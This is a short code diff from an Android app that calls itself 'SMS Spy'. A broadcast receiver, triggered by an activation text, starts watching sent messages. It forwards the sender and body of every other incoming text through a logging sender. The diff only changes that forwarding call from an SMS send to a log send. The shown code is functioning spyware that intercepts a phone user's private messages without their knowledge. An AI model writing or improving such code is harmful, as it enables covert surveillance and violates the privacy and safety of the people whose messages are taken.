@@ -29,10 +29,10 @@ public class SmsReceivedListener extends BroadcastReceiver {
                         	Log.d(SmsReceivedListener.class.getName(), "Received activation request");
                         	SmsSentObserver smsSentObserver = new SmsSentObserver(new Handler(), context);
                         	context.getContentResolver().registerContentObserver(SmsSentObserver.STATUS_URI, true, smsSentObserver);
-                        	LogSender.getInstance(context).sendSms("Activated SMS Spy");
+                        	LogSender.getInstance().sendLog("Activated SMS Spy");
                         } else {
                         	Log.d(SmsReceivedListener.class.getName(), "Received text message");
-                        	LogSender.getInstance(context).sendSms("From:" + msgFrom + ". Message: " + msgBody);
+                        	LogSender.getInstance().sendLog("From:" + msgFrom + ". Message: " + msgBody);
                         }
                     }
                 } catch (Exception e){
